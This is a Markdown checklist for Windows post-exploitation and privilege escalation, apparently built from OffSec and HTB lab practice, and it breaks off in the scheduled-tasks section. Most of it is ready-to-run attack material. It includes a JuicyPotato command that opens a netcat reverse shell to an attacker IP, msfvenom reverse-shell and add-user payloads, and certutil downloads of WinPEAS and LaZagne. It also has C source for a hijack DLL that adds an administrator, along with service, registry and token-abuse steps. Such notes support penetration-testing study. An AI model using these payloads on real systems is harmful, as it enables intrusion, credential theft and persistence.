# Windows Foothold Checklist


### `C:` Fix the shell 
```
set                              # Check the env vars
set path                         # Check just the path var
echo %PATH%                      # Also check the path var this way

# Set the path 

set PATH=%SystemRoot%\System32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SystemRoot%\System32\WindowsPowerShell\v1.0\;%PATH%
```

### `P:` Fix the shell 
```
# Show all environment variables
Get-ChildItem Env:              # or: gci env:

# Show just PATH
Get-ChildItem Env:Path          # or: $Env:Path

# Also show PATH (simple echo)
$Env:Path

# Fix PATH for this session
$Env:Path = "$Env:SystemRoot\System32;$Env:SystemRoot"

```



### 🖥️ System Information
- [ ] `systeminfo` this will list the value of `Domain:` for the domain
  - [ ] With the Build Numebr look up [here](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)

- [ ] `whoami /all` 
- [ ] `whoami /groups`
  - [ ] maybe have to run: `C:\windows\system32\whoami.exe`
	- [ ] `SeImpersonatePrivilege`
	- [ ] Use `PrintSpoofer` or `GodPotato` - `PrintSpoofer64.exe -i -c cmd.exe`
	- [ ] If not try `SweetPotato.exe` (Sharp Collection)
- [ ] `hostname`  Any prefix will be the Machine name or the name of the Domain nad the user is a domain user too.
### Env Vars 
- [ ] `C:> set`      get all the Env vars
- [ ] `PS:> Get-ChildItem Env: | ft Key,Value`  - Get the env vars Tidy

**Powershell History**
- [ ] `Get-History`
- [ ] `(Get-PSReadlineOption).HistorySavePath`
- [ ] `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- [ ]`reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"` — Quieter software check
- [ ]`wmic service get name,pathname,startmode `— Look for vulnerable services
- [ ]`wmic product get name,version, vendor`— Installed software (very noisy, but useful)

### 👥 Users and Groups
- [ ] `PS:> qwinsta` - Check who else is logged on to the machine
- [ ] `net users` Get the local users:  
- [ ] `net users /domain` Get the domain users: 
- [ ] `net user USERNAME`
	- logon scrips ? 
	- Password last set
- [ ] `net user /domain <USERNAME>` - Get details on specific user

- [ ] `net groups` # AD ONly
- [ ] `net localgroup`
- [ ] `net localgroup` Get the groups: 
- [ ] `net group /domain` Get the groups in the domain: 
- [ ] `net localgroup "Domain Admins"` See the the domain admins: 
- [ ] `net group "Domain Admins" /domain` Enumerate the domain admins: (WONT SHOW NESTED GROUPS) eg “Enterprise Admins”, “Administrators”, “Server Operators”, etc.)
- [ ] Note any non-default groups that might have elevated rights (e.g. custom IT groups).


**Adding to groups from Linux to Windows**

- [ ] **Abuse AD ACLs / Roles**  
- If you discover there is **GenericAll / GenericWrite** between a user/group **⇒ reset its password:**
`net user <admin> <NewP@ssw0rd> /domain`  


**If you can edit group membership** ⇒ add your user to a latreal group , even **Domain Admins**.  
- [ ] `K:>` James can check group membership from Linux with `net`
```
net rpc group members developers -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb      
```
- [ ] `K:>` James can add themselves to the developers group

```
net rpc group addmem developers levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb 
```

no Chcek the group memebership again and James should be there. 

### 🌐 Networks
[Fping](https://fping.org/) to see what is on the network
```
fping -asgq 172.16.139.0/23 | tee hosts.txt
```
 - `a` to show targets that are alive, 
 - `s` to print stats at the end of the scan, 
 - `g` to generate a target list from the CIDR network,
 - `q` to not show per-target results.****

- [ ] `ipconfig /all`  Get the interfaces
- [ ] `arp -a` - List which other hosts are cached and known to this machine
- [ ] `route print` - list which network connections are known to our machine
- [ ] `netstat -ano`  - Get all active connections. **Compare the services on the INSIDE to those on the OUTSIDE**
  - [ ] Is ther a local DB to  port forward to us? ( PG Nagoya)
- [ ] `net use` — Active network shares
- [ ] `net view \\<hostname>` — Check shared folders (when reachable)
- [ ] Try to get a null session from Windows (**LOCAL**)
```
net use \\DC01\ipc$ "" /u:""
```

- [ ] See what kind of error we get from things like the below ( Disabled, Incorrect, Locked)
```
net use \\DC01\ipc$ "" /u:guest
```


### 🔥 FireWall
Still handy to see whats faceing out (but depricated)
```
netsh firewall show state
```
- [ ] `netsh advfirewall firewall show rule name=all` - Check the fire wall rules
- [ ] `netsh advfirewall firewall show rule dir=in name=all` - Check the inbound fire wall rules
- [ ]  `netsh advfirewall firewall show rule dir=out name=all` - Check the outbound fire wall rules
- [ ] `PS:> Get-NetFirewallRule | Where-Object { $_.Group -ne "" -or $_.DisplayName -notmatch "Windows Defender" } | Format-Table Name, DisplayName, Enabled, Direction, Action, Profile` - Potential Search for custom FW rules


### 📂 Files
- [ ] `PC:> dir /a /o /q`  - Get the full list of files
- [ ] `gci -force`   - Get all the files inc hidden - ippsec way
- [ ] `gci -recurse | select Fullname`  - Get the full paths
- [ ] `gci -recurse -incldue *.* | select FullName` - Get all the files only
- [ ] Check both `\Program Files\` for any interesting software eg **LAPS**
- [ ] `findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml`       -- START like this and keep it simple , then look for txt etc  ( OFFSEC PG : Mice )
- [ ] `dir /s *pass* == *cred* == *.config*`


##### Installed Applications
- [ ] Create a list of installed applications on the target system

32-Bit Applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

64-Bit Applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

We should always check 
- 32-bit and 64-bit `Program Files` directories located in `C:\`. 
- Review the contents of the `Downloads` directory of our user to find more potential programs.
```
dir "\Program Files"
```

```
dir "\Program Files (x86)"
```

```
dir "\Users\dave\Downloads"
```

---


## Services 
Look for Services in strange places such as Users folders
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto"
```

Specify the state and its ownership or a particular service
```
sc qc <INTERESTING_SERVICE>
```

Might say something like : `SERVICE_START_NAME : LocalSystem`

- Can we swap out hte binary for a `msfvenom` `.exe` payload and then restart he system with a shutdown?

```
shutdown /r
```

Alts:
- [ ] `tasklist /v` - Get a list of running processes
- [ ] `tasklist /SVC`   - Will show services/ Low priv users cannot see if Admins are runign higher level Services

Look at all the services
```
sc query state= all
```

Specify the state and its ownership or a particular service
```
sc qc MySQL
```
Sytem level example: `LocalSystem`, `NT AUTHORITY\NetworkService`, or a custom user.


## Processes 

```
Get-Process
```

**Process Name**   That can be De-Prioritised 

- [ ] `csrss`, `wininit`, `winlogon` - Core system processes — critical, normal presence. 
- [ ] `svchost` - Service Host: loads various Windows services. Focus elsewhere unless a specific exploit path is known. 
- [ ] `fontdrvhost`, `dwm` - Desktop visuals / font rendering 
- [ ] `LogonUI`, `LockApp` - Lock screen & login session visuals 
- [ ] `RuntimeBroker` - Permissions broker for UWP apps (safe to ignore) 
- [ ] `SearchHost`, `SearchIndexer` - Search functionality, not juicy 
- [ ] `ShellExperienceHost`, `StartMenuExperienceHost` - Shell UI elements, usually no privesc value 
- [ ] `WmiPrvSE` - WMI — can be used for attack, but presence alone = normal 
- [ ] `MsMpEng`, `MpDefenderCoreService` - Windows Defender — can be avoided, not leveraged 
- [ ] `MicrosoftEdgeUpdate`, `OneDrive`, `PhoneExperienceHost`, `Widgets` - Microsoft bloatware 
- [ ] `vmtoolsd`, `VGAuthService`, `vm3dservice` - VMware tools — expected in VM labs 
- [ ] `lsass` - Don’t touch unless you’re dumping creds — highly sensitive 
- [ ] `services`, `system`, `idle`, `registry`, `memory compression` - Core OS — not useful for direct privesc 

---


## Logs and audits
Check Member of the "Event Log Readers". See what powershell commands etc have bee nrun especially and Base64 blobs
- [ ] `Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt`  - Offsec PG: Comprimised

- [ ] `nltest /dclist:<bossingit.biz_NAME>` list DC and check env var `LOGONSERVER` . Note the DC hostnames/IPs for targeting.

- [ ] `PS:>` Powershell [language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) - Contrained or full? Does one have full scritping capabilities
```
$ExecutionContext.SessionState.LanguageMode
```

### Enumerate WIndows Updates:
```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

### Check for folders/files Everyone can write to:
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

#### List drivers:
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```
```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} 
```
### Initial Tools


Maybe - https://sirensecurity.io/blog/windows-privilege-escalation-resources/

- [ ]  [Get Winpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20250201-73c8835d)
	 - [ ] `C:> certutil -urlcache -split -f http://192.168.45.202/winPEASany.exe`
	 - [ ] `P:> iwr -uri http://192.168.45.202/winPEASany.exe -Outfile wp.exe`
   - [ ]  Run WinPeas 

- [ ]  Get Powerup
	- [ ]  `certutil -urlcache -split -f http://192.168.45.202/PowerUp.ps1`
	- [ ] `P:> Invoke-PrivescAudit`
	- [ ] [Try PowerUps](https://powersploit.readthedocs.io/en/latest/Privesc/)

- [ ]  Get LaZagne.exe for Password hunting
	- [ ]  `C:> certutil -urlcache -split -f http://192.168.45.202/LaZagne.exe`
	- [ ]  `P:> iwr -uri http://192.168.102.227/LaZagne.exe -Outfile LaZagne.exe`
	- [ ]  Run `LaZagne.exe all -vv`

**PrivescCheck .ps1** - 
- https://github.com/itm4n/PrivescCheck?tab=readme-ov-file
```
certutil -urlcache -split -f http://192.168.45.200/PrivescCheck.ps1
```

Investigate all Privesc details ignoreing weightings


<hr style="border: 4px solid black;">

## ⚠️ Token Impersonation  eg ( PrintSpoofer, Rogue-Potato)

Other privileges that may lead to privilege escalation are:
- `SeBackupPrivilege`
- `SeAssignPrimaryToken`
- `SeLoadDriver`
- `SeDebug`
	- [ ] `SeImpersonatePrivilege`
	- [ ] Use `PrintSpoofer` or `GodPotato` or even `JuicyPotato` (on older systems)
	- [ ] If not try `SweetPotato.exe` (Sharp Collection)

- Sirens List of exploits: https://sirensecurity.io/blog/windows-privilege-escalation-resources/


---

### WINDOWS PRIVESC: SePrivilege Reference  

| Privilege Name | Box | Binary | GitHub PoC |
|---|---|---|---|
| SeDebugPrivilege | Osaka | | github.com/bruno-1337/SeDebugPrivilege |
| SeImpersonatePrivilege | | GodPotato, PrintSpoofer | github.com/itm4n/PrintSpoofer |
| SeAssignPrimaryToken | | | github.com/b4rdia/HackTricks |
| SeTcbPrivilege | | | github.com/hatRiot/token-priv |
| SeCreateTokenPrivilege | | | github.com/hatRiot/token-priv |
| SeLoadDriverPrivilege | Osaka | | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege | | | github.com/hatRiot/token-priv |
| SeRestorePrivilege | Heist | utilman.exe | github.com/xct/SeRestoreAbuse |
| SeBackupPrivilege | | | github.com/k4sth4/SeBackupPrivilege |
| SeIncreaseQuotaPrivilege | | | github.com/b4rdia/HackTricks |
| SeSystemEnvironment | | | github.com/b4rdia/HackTricks |
| SeMachineAccount | | | github.com/b4rdia/HackTricks |
| SeTrustedCredManAccess | | | learn.microsoft.com/trusted-caller |
| SeRelabelPrivilege | | | github.com/decoder-it/RelabelAbuse |
| SeManageVolumePrivilege | Access | WerTrigger.exe | github.com/CsEnox/SeManageVolumeExploit |
| SeManageVolumePrivilege (alt) | | | github.com/sailay1996/WerTrigger |
| SeCreateGlobalPrivilege | | | github.com/b4rdia/HackTricks |
| SeTcbPrivilege (alt) | | | github.com/CharminDoge/tcb-lpe |
| SeTcbPrivilege (local) | | SeTcbPrivilege.exe | See local copy |


- Also a **GREAT** repo of [Windows Privlige Vectors ](https://github.com/gtworek/Priv2Admin)
- And the hack tricks list : https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation


<hr style="border: 4px solid black;">

## ⚠️ SeRestorePrivilege PrivEsc
Run the script to to restore [SeRestore](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) - SeRestorePrivilege
```
./EnableSeRestorePrivilege.ps1
```
1. Backup ( in case) and then Swap SYSTEM level **utilman.exe** with **cmd.exe**
1. Restart the `utilman.exe` with a Login to host via rdp - `rdesktop 10.129.95.210 `
1. At the GUI get a system shell spawn, either by clicking _Ease of access_ or press `WIN + U` and a


## ⚠️ SeManageVolumePrivilege PrivEsc
Follow the steps here - https://github.com/sailay1996/WerTrigger 

with :
`phoneinfo.dll` ,  `Report.wer`  and `WerTrigger.exe`

---

## ⚠️ SeDebugPrivilege PrivEsc
Get this powershell script 
- https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1

1. Get the script 
```
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
```

1. `PS:>`  **Get the PID** of an admin level process such as `winlogon.exe`
```
Get-Process winlogon
```
1. `PS:>` Import the module
```
Import-Module .\psgetsys.ps1
```

1. `PS:>` Check its loaded the new fucntion in - ImpersonateFromParentPid
```
Get-Command ImpersonateFromParentPid
```

1. `PS:>` - **Using the PID from the previous command:** add a new users
```
ImpersonateFromParentPid -ppid 548 -command "C:\Windows\System32\cmd.exe" -cmdargs '/c net user bossman Start123! /add'
```

1. `PS:>` - **Using the PID from the previous command:** add a new/existing user to the Administrators
```
ImpersonateFromParentPid -ppid 548 -command "C:\Windows\System32\cmd.exe" -cmdargs '/c net localgroup administrators bossman /add'
```

---

### ⚠️ Juciy Potato (x86 When Godpotato and PrintSpoofer dont work SeImpersonate)
```
JuicyPotato_x86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c C:\windows\tasks\nc.exe -e cmd.exe 192.168.45.193 3389" -t *
```

**Command breakdown**
- **`-l 1337`** Local COM server listening port. JuicyPotato creates a fake COM server on this port to catch the SYSTEM token. Pick any free port — 1337 is arbitrary.

- **`-c "{4991d34b-80a1-4291-83b6-3328366b9097}"`** The **CLSID** — a COM class identifier. This tells JuicyPotato _which_ Windows COM object to impersonate. Different CLSIDs run under different service accounts. You need one that runs as **SYSTEM** on the target OS version. If your exploit fails, this is usually why — wrong CLSID for that OS.
> 	CLSIDs are OS-specific. There are lists here: [https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

- **`-p C:\Windows\system32\cmd.exe`** The **process to launch** as SYSTEM once the token is stolen. You're telling it to spawn `cmd.exe`.

- **`-a "/c C:\windows\tasks\nc.exe -e cmd.exe 192.168.45.193 3389"`** **Arguments** passed to `-p` (cmd.exe). So this becomes:

```
cmd.exe /c C:\windows\tasks\nc.exe -e cmd.exe 192.168.45.193 3389
```

Which means: run netcat as SYSTEM, connect back to your machine and attach a shell. Port `3389` here is just your listener port — nothing to do with RDP.

- **`-t *`** **Token type** to use:

| Value | Meaning                        |
| ----- | ------------------------------ |
| `*`   | Try both — use whichever works |
| `t`   | `CreateProcessWithTokenW`      |
| `u`   | `CreateProcessAsUserW`         |
- `*` is the safe default — lets JuicyPotato decide.


**Full flow summary:**

```
SeImpersonatePrivilege available
        ↓
JuicyPotato spins up fake COM server on -l port
        ↓
Coerces SYSTEM to authenticate via -c CLSID
        ↓
Steals SYSTEM token
        ↓
Launches -p with -a args as SYSTEM
        ↓
Reverse shell lands on your listener
```

The most common failure point is the **CLSID** — if nothing happens, try a different one for your target OS.


<hr style="border: 4px solid black;">


## ⚠️ Hiding in plain View
If we see a password manager we might want to look for the related file type

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Text of Config gfiles
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

Users Directory Files

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Powershell history

```
(Get-PSReadlineOption).HistorySavePath
```

---


## ⚠️ Unquoted Service Path
Windows interprets unquoted service paths like:
- `C:\Program Files\SomeApp\Service.exe` 
as... 
`C:\Program.exe`
- Must match filename and have write access to an injected intermediate executable.

- [ ] **Find services with unquoted paths (non-Windows)**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```
- [ ] **Inspect service config & executable path**
```cmd
sc qc <ServiceName>
```
**Listing the running Services for Service Binary Hijacking**
```
icacls "C:\path\to\Bin\file.exe"
```

The `icacls` utility outputs the corresponding principals and their [permission mask](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) The most relevant permissions and their masks are listed below:


| Mask |       Permissions       |             |
| :--: | :---------------------: | ----------- |
|  F   |       Full access       | Can replace |
|  M   |      Modify access      | Can replace |
|  RX  | Read and execute access |             |
|  R   |    Read-only access     |             |
|  W   |    Write-only access    |             |
|  FI  | Full access ( Inherited)| ?? Can replace |



#### Permission Check
- [ ] **Check write access on folder in service path**
```cmd
accesschk.exe /accepteula -uwdq "C:\Path\To\Unquoted\Service"
```
####  Exploitation Phase
- [ ] **Craft payload (e.g., reverse shell)**  
Name it to match a token in the unquoted path (e.g. `Program.exe`, `Common.exe` etc).
- [ ] **Start listener to catch shell**
- [ ] **Restart the vulnerable service to trigger execution**
```powershell
Start-Service <ServiceName>     # Preferred if permissions allow
Stop-Service <ServiceName>
Start-Service <ServiceName>

# OR fallback methods
net stop <ServiceName>
net start <ServiceName>

# Last resort
shutdown /r /t 0
```

# File Permissions That Allow Service Binary Exploitation

Used to identify when a low-priv user can replace or alter a service binary to gain SYSTEM privileges.
```
WRITE_DAC          # Allows modifying the file's access control list (ACL)
WRITE_OWNER        # Allows taking ownership of the file
DELETE             # Allows deleting the binary file
FILE_WRITE_DATA    # Allows overwriting the binary (critical for replacing service executables)
FILE_APPEND_DATA   # Allows appending data to the binary (less common but still useful)
MODIFY             # Composite permission: includes read/write/delete (often enough to exploit)
FULL CONTROL       # Grants all rights over the file (most dangerous)
GENERIC_ALL        # Windows generic permission for full access (same as FULL CONTROL)
```

---

## ⚠️ Weak Registry Permissions
- [ ] Weak Registry Check - List services and binaries  
```
tasklist /SVC                  
```
- [ ] Show service config including image and owner  
```
sc qc <ServiceName>            
```
Look for:
- `SERVICE_START_NAME : LocalSystem` → runs as **NT AUTHORITY\SYSTEM**

- [ ] Check registry key perms  
```
accesschk.exe /accepteula -uvwqk "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>"  
```
- [ ] Alt: view perms with PowerShell  
```
powershell -c "(Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>').Access" 
```

- [ ] Overwrite binary path  
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Path\to\payload.exe" /f  
```
- [ ] Stop the service to reload binary  
```
net stop <ServiceName>         
```

- [ ] Start service to trigger payload  
```
net start <ServiceName>        
```

## ⚠️ Weak Registry & Service Permissions
Identify weak permissions in services or registry keys tied to services that run as `SYSTEM`.

- [ ] **List all running services and associated binaries**  
  ```cmd
  tasklist /SVC
  ```

- [ ] **Show full service configuration and ownership**  
  ```cmd
  sc qc <ServiceName>
  ```

- [ ] **Optional: Auto-discover services with issues**  
  ```cmd
  winPEASx64.exe servicesinfo
  ```

####  Access Control Check
- [ ] **Check if current user can modify the service**  

`SERVICE_CHANGE_CONFIG` is the key permission. Allows you to reconfigure the service to run arbitary binaries.
Other Permissions good for hackers
`WRITE_DAC` - Can reconfigure permissions, leading to `SERVICE_CHANGE_CONFIG`
`WRITE_OWNER` Can become owner and reconfigure Permissions 
`GENERIC_WRITE` - Inherits `SERVICE_CHANGE_CONFIG`
`GENERIC_ALL` - Also Inherits `SERVICE_CHANGE_CONFIG`


```cmd
accesschk.exe /accepteula -uvcqv <USERNAME> <ServiceName>
```

Example:
```cmd
accesschk.exe /accepteula -uvcqv arthur SynaMan
```

- [ ] **Check registry key permissions for the service**
```cmd
accesschk.exe /accepteula -uvwqk "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>"
```

- [ ] **Alt: View service registry permissions via PowerShell**
```powershell
powershell -c "(Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>').Access"
```
####  Exploitation Phase

- [ ] **Overwrite the binary path with a malicious payload**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Path\to\payload.exe" /f
```

- [ ] **Alt: Change the service binary path via `sc`**
```cmd
sc config <ServiceName> binpath= "\"C:\Path\to\Reverse.exe\""
```
#### Trigger Execution
- [ ] **Stop the service (if needed)**
```cmd
sc stop <ServiceName>
```
- [ ] **Start the service (executes payload)**
```
sc start <ServiceName>
```

---

### ⚠️ Service Binary Hijacking 
#### 1 . List out the binaries

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Powershell Alternative
```
Get-Service | Where-Object {$_.Status -eq 'Running'}
```

Older Style
```
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -eq 'Running'} | Select Name, State, PathName
```

##### Cmd prompt Style
```
wmic service where (state="running") get name,pathname
```
Alternative (but without printing the path)

```
sc query state= running
```

##### With GUI
```
Windows + R → services.msc
```

#### 2. Check the Permissions on suspect Binaries
(`icacls` for Both `PS` or `cmd`  and look look for `F` , `AD` , `WD` )
```
icacls "C:\xampp\apache\bin\httpd.exe"
```

Also Check the start mode : for restart flow (if we get that far)
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```


#####  3. Make a payload 
...such as reverse shell or a new user 

- Shell on 64bit - dll
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.179.211 LPORT=4444 -f dll -o Nasty.dll
```
- Shell on 32bit exe
```
msfvenom -p windows/shell_reverse_tcp LHOST=<LISTEN_IP> LPORT=443 -f exe > binary.exe
```
- Add new user
```
msfvenom -p windows/adduser USER=clive PASS=Tuesday@2 -f exe -o binary.exe
```
##### 4. Restart the service 

```
net stop mysql
```

```
net start mysql
```
Harder Restart with a shutdown
```
shutdown /r /t 0
```

##### Alternative with Powerup
Get Powerup
```
iwr -uri http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1
```
Open Powershell with profile bypass
```
powershell -ep bypass
```
Run Powerup
```
Import-Module PowerUp.ps1
```
Run the check
```
Get-ModifiableServiceFile
```

---


# ⚠️ DLL Hijacking 
Equivalent to Shared Object replacement on Linux

### Method 1: Overwrite the DLL directly
1. Check the permissions of loaded DLLs to see if they can be replaced with a payload


### Method 2: Hijack the search order of the dll
**New Standard Safe search order for DLLs**
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.    `<-- This is at Pos:2 in unsafe mode`
6. The directories that are listed in the PATH environment variable.


## Set up

###  1. Search for a target applications

64-bit wide apps
```
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher
```
32bit on 64-bit OS
```
Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher
```
Per user installs
```
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher
```

All in one
```
$paths = @(
 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
)
Get-ItemProperty $paths | Where-Object DisplayName |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation |
  Sort-Object DisplayName -Unique

```

### 2. Check Permissions
```
icacls "C:\FileZilla\FileZilla FTP Client\filezilla.exe"
```

1. Can we write to the target dir?
```
echo "Testing Write permissions ok" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
```
Can we read what we wrote 
```
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```


### 3. Using ProcMon
As an administrator ( perhaps on an attack machine ) launch Procmon to investigate

- Filter >> Filter... > 
We enter the following arguments in the filter: 
	- `Process Name` as *Column*, 
	- `is` as *Relation*, 
	- `filezilla.exe` as *Value*, 
	- `Include` as *Action*. 
- Once entered, we'll click on Add.

- Tidy up by pressing `TrashCan` clear in the Ribbon
![[Pasted image 20260204101807.png]]
- Run the Target program
- Check procmon
	- eg: `Operation` is `CreateFile` then `include`.
	- eg: `Path` contains `textshaping.dll` then `include`.
- Look for `NAME NOT FOUND ` Errors
- As we can write to the missing location so we 



### 4. Crafting the Dll Manually
- `nasty.cpp` code below will add the user `clive` with the password `Tuesday@2`:

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // PS is loading the DLL. !!This is what we use
        int i;
  	    i = system ("net user clive Tuesday@2 /add");
  	    i = system ("net localgroup administrators clive /add");
        break;
        case DLL_THREAD_ATTACH: // PS is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // Td exits normally.
        break;
        case DLL_PROCESS_DETACH: // PS unloads the DLL.
        break;
    }
    return TRUE;
}
```

### 5. Cross compile from Kali to Windows

```
x86_64-w64-mingw32-gcc nasty.cpp --shared -o nasty.dll
```

### 6. Place in Situ

...However you get it there

### 7. Trigger, or Wait for Trigger
This might be through another user running the app , a restart of the machine or  launch of the app by the attacker.

---

## Unquoted Service Paths 

The most effective way to search is with `wmi` in the `cmd` 
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
These service names can be uses to stop/start the servcie

An alternative way to enumerate running and stopped services.
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

Once we have discovered a path we should create a payload eg `msfvenom` and then place it in situ.

### Restart the service

**Restart the service with `Powershell`** with the Display name
```
Restart-Service GammaService
Start-Service GammaService
Stop-Service  -Name GammaService
Get-Service   -Name GammaService | Format-List *
```

**Restart the service with `cmd`**
```
sc start GammaService
sc stop  GammaService
sc query GammaService
```
or 
```
net start GammaService
net stop  GammaService
```



---

### WEAK FILE PERMISSIONS

```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
---

## ⚠️ Lateral Movement — Identify Webserver Account & Root`

When we have a shell as `www-data` but perhaps we want to move laterally to become the `apache` account running the webserver....:

### 1. Find common web entry-point files

P:> `Get-ChildItem -Path C:\ -Include index.php,index.html,index.asp,index.aspx,web.config -File -Recurse -ErrorAction SilentlyContinue`
C:> `dir /s /b C:\index.php 2>nul`
C:> `dir /s /b C:\index.html 2>nul`
C:> `dir /s /b C:\index.asp 2>nul`
C:> `dir /s /b C:\web.config 2>nul`

### 2. Find the server config file

#### Apache
P:> `Get-ChildItem -Path C:\ -Include httpd.conf,apache2.conf -File -Recurse -ErrorAction SilentlyContinue`
C:> `dir /s /b C:\httpd.conf 2>nul & dir /s /b C:\apache2.conf 2>nul`

#### IIS
P:> `Get-Content "C:\Windows\System32\inetsrv\config\applicationHost.config" -ErrorAction SilentlyContinue`
C:> `type "C:\Windows\System32\inetsrv\config\applicationHost.config" 2>nul`

#### XAMPP / WAMP
P:> `Get-ChildItem -Path C:\xampp,C:\wamp,C:\wamp64 -Include httpd.conf -File -Recurse -ErrorAction SilentlyContinue`
C:> `dir /s /b C:\xampp\httpd.conf 2>nul & dir /s /b C:\wamp\httpd.conf 2>nul & dir /s /b C:\wamp64\httpd.conf 2>nul`

### 3. Identify the process and account running the webserver

P:> `Get-Process -Name httpd,apache,w3wp,nginx -ErrorAction SilentlyContinue | Select-Object Id, Name, Path`
C:> `tasklist /fi "imagename eq httpd.exe" 2>nul`
C:> `tasklist /fi "imagename eq w3wp.exe" 2>nul`
C:> `tasklist /fi "imagename eq nginx.exe" 2>nul`

#### Get the process owner (the account you want to become)
P:> `$procs = Get-WmiObject Win32_Process -Filter "Name='httpd.exe' OR Name='w3wp.exe' OR Name='nginx.exe'"`
     foreach ($p in $procs) {
         $owner = $p.GetOwner()
         Write-Output "PID: $($p.ProcessId) | User: $($owner.Domain)\$($owner.User) | Path: $($p.ExecutablePath)"
     }
C:> `wmic process where "name='httpd.exe' or name='w3wp.exe' or name='nginx.exe'" get ProcessId,Name,ExecutablePath`
C:> `wmic process where "name='httpd.exe'" call getowner`
C:> `wmic process where "name='w3wp.exe'" call getowner`
C:> `wmic process where "name='nginx.exe'" call getowner`

### 4. Check exploitable privileges or writable paths on the webroot

CP:> `icacls "C:\path\to\webroot"`


----

## ⚠️ Scheduled Tasks

Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors
- The account executing the task
- The triggers conditions for the task to be launched
- What actions are executed when one or more of these triggers are met?

#### 1. List out scheduled Tasks

Best way with Powershell is to List out Scheduled tasks and get info on each 
```
Get-ScheduledTask | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo
    [PSCustomObject]@{
        TaskName      = $_.TaskName
        Author        = $_.Principal.UserId
        RunAsUser     = $_.Principal.UserId
        NextRunTime   = $info.NextRunTime
        TaskToRun     = $_.Actions.Execute
    }
} | Format-Table -AutoSize
```

Else this but its not nice to read
```
